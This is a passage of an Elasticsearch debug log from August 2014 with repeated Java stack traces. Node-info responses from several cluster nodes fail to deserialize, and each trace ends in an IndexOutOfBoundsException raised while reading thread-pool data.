    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:06,121][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [myWkK47kRxSh93CRKH5O3w]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8435
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:06,122][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [lXDpSZ3OQCu6eVulQVcbiQ]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8528
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:596)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:06,121][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [RgzCfs2_RE27p6RgzEb1Jw]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:310)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8436
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:06,126][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [lLjxLWhoSti-hvdAuJ2wUg]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:310)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8436
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:596)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:06,128][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [WqnW6SX3TfCLTbBvFcYQgA]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:310)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8434
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:06,369][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [lLjxLWhoSti-hvdAuJ2wUg]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8436
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:596)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:06,369][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [lXDpSZ3OQCu6eVulQVcbiQ]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8528
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:596)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:06,369][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [WqnW6SX3TfCLTbBvFcYQgA]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8434
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
